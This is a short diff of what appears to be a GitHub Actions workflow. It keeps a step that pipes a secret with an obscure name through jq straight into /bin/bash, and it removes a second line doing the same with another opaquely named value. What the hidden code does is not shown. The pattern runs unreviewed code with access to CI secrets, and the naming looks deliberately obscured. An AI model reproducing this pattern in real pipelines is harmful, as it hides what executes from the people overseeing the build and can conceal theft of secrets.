@@ -22,7 +22,6 @@ jobs:
           l8: ${{ secrets.l8 }}
         run: |
           printf '%s' "$l8" | jq -r .v75 | /bin/bash
-          printf '%s' "$iylcn181" | jq -r .z30 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
